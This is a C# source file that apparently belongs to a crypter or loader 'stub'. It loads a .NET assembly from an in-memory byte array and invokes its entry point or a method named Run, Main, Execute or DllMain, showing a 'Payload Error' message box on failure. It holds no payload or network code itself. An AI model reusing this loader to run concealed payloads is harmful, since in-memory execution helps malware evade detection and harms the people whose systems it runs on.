using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace NRE.Stub.Loaders
{
    /// <summary>
    /// Load and execute a .NET assembly from memory (CLR in-process).
    /// Uses Assembly.Load and invokes entry point or a well-known method for DLLs.
    /// </summary>
    public static class DotNetLoader
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, uint uType);

        private const uint MB_OK = 0;
        private const uint MB_ICONERROR = 0x10;

        public static void LoadAndExecute(byte[] assemblyBytes)
        {
            if (assemblyBytes == null || assemblyBytes.Length == 0)
            {
                ShowError("Payload bytes are null or empty.");
                return;
            }

            try
            {
                var asm = Assembly.Load(assemblyBytes);
                var ep = asm.EntryPoint;
                if (ep != null)
                {
                    object[] args = ep.GetParameters().Length > 0 ? new object[] { new string[0] } : null;
                    ep.Invoke(null, args);
                    return;
                }

                var typesToSearch = asm.GetExportedTypes().Length > 0 ? asm.GetExportedTypes() : asm.GetTypes();
                foreach (var type in typesToSearch)
                {
                    try
                    {
                        foreach (var method in type.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static))
                        {
                            if (method.Name != "Run" && method.Name != "Main" && method.Name != "Execute" && method.Name != "DllMain")
                                continue;
                            var prms = method.GetParameters();
                            if (prms.Length > 1) continue;
                            try
                            {
                                var parms = prms.Length == 1 ? new object[] { new string[0] } : null;
                                method.Invoke(null, parms);
                                return;
                            }
                            catch (Exception ex)
                            {
                                ShowError("Invoke failed: " + (ex.InnerException ?? ex).Message);
                                return;
                            }
                        }
                    }
                    catch (ReflectionTypeLoadException) { }
                }

                ShowError("No entry point found in assembly: " + (asm.GetName().Name ?? "?"));
            }
            catch (Exception ex)
            {
                ShowError("Load failed: " + (ex.InnerException ?? ex).Message);
            }
        }

        private static void ShowError(string message)
        {
            try
            {
                MessageBoxW(IntPtr.Zero, message ?? "Unknown error", "NRE Payload Error", MB_OK | MB_ICONERROR);
            }
            catch { }
        }
    }
}
